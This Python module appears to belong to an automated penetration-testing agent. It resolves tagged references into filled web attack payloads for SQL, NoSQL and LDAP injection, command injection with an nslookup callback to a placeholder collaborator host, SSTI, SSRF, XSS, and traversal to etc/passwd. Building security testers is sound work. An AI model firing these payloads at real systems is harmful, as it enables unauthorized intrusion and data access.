"""Resolve a tagged ``payload_ref`` to a fireable, parameterized payload (§9).

The tagged library (``library.py`` + ``data/corpus/*.yaml``) is a *catalog*: its
value is the ``(vuln_class, inferred_sink_type, oracle_type, graph_edge_on_success)``
tagging, and §9 deliberately keeps raw exploit strings OUT of the catalog. This
module is the one place the actual payload *templates* live, so the catalog stays
a pure tag index and the strings have a single, reviewable home.

**Value/location decoupling (Nuclei-style).** The resolver produces the complete
parameter *value* only — never the injection *location*. Where a payload goes
(query / body / path / header) already lives on the graph ``Parameter.location``
and is applied by ``explorer._fire_with_value``; a template resolves to the full
string that becomes the value handed to ``fire_request(payload=...)``. A template
is therefore a *complete value to send*, not a fragment to splice: the UNION
payload is the whole ``' UNION SELECT 1,2,3-- -`` value, not a piece the caller
positions. Templates never encode placement.

**Where templates live / slot convention.** Every ``payload_ref`` in the base
slice and both corpus files maps to a short, textbook, parameterized template
here. Templates are stimulus, not a payload hoard — each is the minimal standard
for its technique with named slots the caller fills at fire time:

    {nonce}   unique OOB-callback subdomain label (per-fire, correlates the hit)
    {collab}  collaborator domain the OOB channel points at
    {canary}  execution-confirmation tag (proves a script/template actually ran)
    {sleep}   timing-oracle delay in seconds
    {columns} UNION column list matched to the target's column count
    {predicate} boolean-blind TRUE/FALSE predicate
    {pattern} NoSQL ``$regex`` predicate body
    {expr}    SSTI arithmetic expression (renders to its product on eval)
    {target}  traversal target path segment
    {object_id} substituted object identifier (BOLA/IDOR)
    {priv_field} privileged attribute name (mass assignment)

Slot filling is **targeted replacement**, never ``str.format`` — payloads carry
literal braces (Jinja ``{{7*7}}``, JSON ``{"$ne":null}``) that ``format`` would
choke on. A template's required slots are exactly the ``{name}`` tokens from the
fixed vocabulary that appear in it; literal braces are left untouched.

**Scope — who consumes this.** The resolution path serves the *generic* Explorer
pipeline (``get_payloads`` → resolve → ``fire_request(payload=...)``) and the
Phase 5 Coordinator. It intentionally does NOT retrofit the bespoke eval
detectors (``juiceshop_live``, the VAmPI harness): those are correctly
per-target/per-challenge tuned and must stay so — routing them through generic
templates would regress Task 1 coverage. This module adds a resolution path; it
never fires and never confirms (no oracle logic, no Validator import).

Vendored + network-free for the same reason as the corpus subset (CLAUDE.md §9):
templates are in-tree and reviewable, not fetched at runtime.
"""

from __future__ import annotations

from reachagent.payloads.library import PayloadEntry, PayloadLibraryError

# Fixed slot vocabulary. A template's *required* slots are exactly the members of
# this set that appear as ``{name}`` in it (minus any with a default) — so literal
# payload braces (which are never one of these tokens) are left alone.
#
# Slot semantics are single-purpose on purpose: a URL-valued slot and a
# file-path-valued slot must never share a name, or a realistic kit that fills the
# shared slot with (say) a URL yields a malformed value for the other class. Hence
# ``file_target`` (path-traversal/LFI file target) is distinct from any URL slot.
_SLOTS: frozenset[str] = frozenset(
    {
        "nonce",
        "collab",
        "canary",
        "sleep",
        "columns",
        "predicate",
        "pattern",
        "expr",
        "file_target",
        "object_id",
        "priv_field",
    }
)

# Per-slot defaults: a referenced slot with a default is optional (the caller may
# override it, else the default fills in). ``file_target`` defaults to a canonical
# read-only traversal target so a path-traversal ref resolves with no kit.
_SLOT_DEFAULTS: dict[str, str] = {
    "file_target": "etc/passwd",
}


class UnknownPayloadRefError(PayloadLibraryError):
    """Raised when a ``payload_ref`` has no template — a dead handle, never silent."""


class MissingSlotError(PayloadLibraryError):
    """Raised when a template needs a slot the caller didn't supply."""


# payload_ref → parameterized template. Covers every ref in the base slice
# (library.yaml) and both corpus files (corpus/*.yaml). Textbook minimal forms;
# raw strings where a template carries backslashes (UNC OOB paths).
_TEMPLATES: dict[str, str] = {
    # -- base slice (data/library.yaml) --------------------------------------
    "bola/object-id-substitution": "{object_id}",
    "idor/direct-object-reference-swap": "{object_id}",
    "mass-assignment/admin-flag-injection": '{"{priv_field}":true}',
    "sqli/error-based/quote-break": "'",
    "sqli/blind/oob-dns-exfil": r"'; EXEC master..xp_dirtree '\\{nonce}.{collab}\poc'-- -",
    "sqli/blind/timing-sleep-paired": "' AND SLEEP({sleep})-- -",
    "xss/reflected/script-tag-canary": "<script>{canary}</script>",
    # -- PayloadsAllTheThings (data/corpus/payloadsallthethings.yaml) --------
    "patt/sqli/error-based/quote-break": "'",
    "patt/sqli/union/column-count-match": "' UNION SELECT {columns}-- -",
    "patt/sqli/auth-bypass/or-tautology": "' OR '1'='1'-- -",
    "patt/sqli/blind/boolean-predicate-pair": "' AND {predicate}-- -",
    "patt/sqli/blind/oob-dns-exfil": r"'; EXEC master..xp_dirtree '\\{nonce}.{collab}\poc'-- -",
    "patt/sqli/blind/time-based-sleep": "' AND SLEEP({sleep})-- -",
    "patt/nosql/operator/ne-auth-bypass": '{"$ne":null}',
    "patt/nosql/blind/regex-predicate-pair": '{"$regex":"{pattern}"}',
    "patt/ldap/filter/wildcard-always-true": "*)(objectClass=*)",
    "patt/cmdi/blind/oob-separator-chain": ";nslookup {nonce}.{collab}",
    "patt/ssti/polyglot/arithmetic-eval": "{{{expr}}}",
    "patt/ssrf/blind/oob-fetch": "http://{nonce}.{collab}/",
    "patt/xss/reflected/img-onerror-canary": "<img src=x onerror={canary}>",
    "patt/xss/stored/svg-onload-canary": "<svg onload={canary}>",
    "patt/path-traversal/dot-dot-slash": "../../../../{file_target}",
    # -- SecLists (data/corpus/seclists.yaml) --------------------------------
    "seclists/fuzzing/sqli/generic-meta-strings": "' OR 1=1-- -",
    "seclists/fuzzing/sqli/time-based-vectors": "' AND SLEEP({sleep})-- -",
    "seclists/fuzzing/nosql/operator-vectors": '{"$ne":null}',
    "seclists/fuzzing/ldap/filter-metachars": "*)(objectClass=*)",
    "seclists/fuzzing/command-injection/oob-separators": ";nslookup {nonce}.{collab}",
    "seclists/fuzzing/ssti/template-eval-expressions": "{{{expr}}}",
    "seclists/fuzzing/xss/canary-handlers": "<img src=x onerror={canary}>",
    "seclists/fuzzing/lfi/encoded-traversal": "..%2f..%2f..%2f..%2f{file_target}",
}


def _slots_in(template: str) -> frozenset[str]:
    """Every vocabulary slot token appearing in ``template``."""
    return frozenset(s for s in _SLOTS if "{" + s + "}" in template)


def required_slots(payload_ref: str) -> frozenset[str]:
    """Slots the caller MUST supply for a ref (unknown ref → error).

    A slot the template uses but which has a default (``_SLOT_DEFAULTS``) is
    optional, so it is excluded here — e.g. ``file_target`` defaults to
    ``etc/passwd``, so a path-traversal ref requires no slot at all.
    """
    template = _TEMPLATES.get(payload_ref)
    if template is None:
        raise UnknownPayloadRefError(f"no template for payload_ref {payload_ref!r}")
    return _slots_in(template) - _SLOT_DEFAULTS.keys()


def known_refs() -> frozenset[str]:
    """Every ``payload_ref`` this resolver can fill — the coverage guard's oracle."""
    return frozenset(_TEMPLATES)


def resolve(payload_ref: str, **slots: object) -> str:
    """Resolve ``payload_ref`` to a filled payload string ready for ``fire_request``.

    Fills each slot by targeted replacement (not ``str.format``, so literal payload
    braces survive). A slot with a default (``_SLOT_DEFAULTS``) is optional — the
    caller's value overrides it, otherwise the default fills in. Raises
    :class:`UnknownPayloadRefError` for a ref with no template and
    :class:`MissingSlotError` for a required (default-less) slot the caller omitted.
    Extra slots the template doesn't use are ignored, so a caller may pass a full
    context kit (nonce/canary/…) to every ref uniformly. Deterministic: pure
    substitution, same inputs → same output.
    """
    template = _TEMPLATES.get(payload_ref)
    if template is None:
        raise UnknownPayloadRefError(f"no template for payload_ref {payload_ref!r}")
    used = _slots_in(template)
    supplied = {k: v for k, v in slots.items() if v is not None}
    missing = (used - _SLOT_DEFAULTS.keys()) - supplied.keys()
    if missing:
        raise MissingSlotError(
            f"payload_ref {payload_ref!r} needs slot(s) {sorted(missing)}; got {sorted(slots)}"
        )
    result = template
    for name in used:
        value = supplied.get(name, _SLOT_DEFAULTS.get(name))
        result = result.replace("{" + name + "}", str(value))
    return result


def resolve_entry(entry: PayloadEntry, **slots: object) -> str:
    """Thin helper: turn a ``get_payloads`` entry into a fireable string.

    Purely mechanical (``entry.payload_ref`` → :func:`resolve`) — no oracle logic,
    no Validator import. The bridge from a sink-matched catalog entry to a payload
    the generic Explorer pipeline / Phase 5 Coordinator hands to ``fire_request``.
    """
    return resolve(entry.payload_ref, **slots)
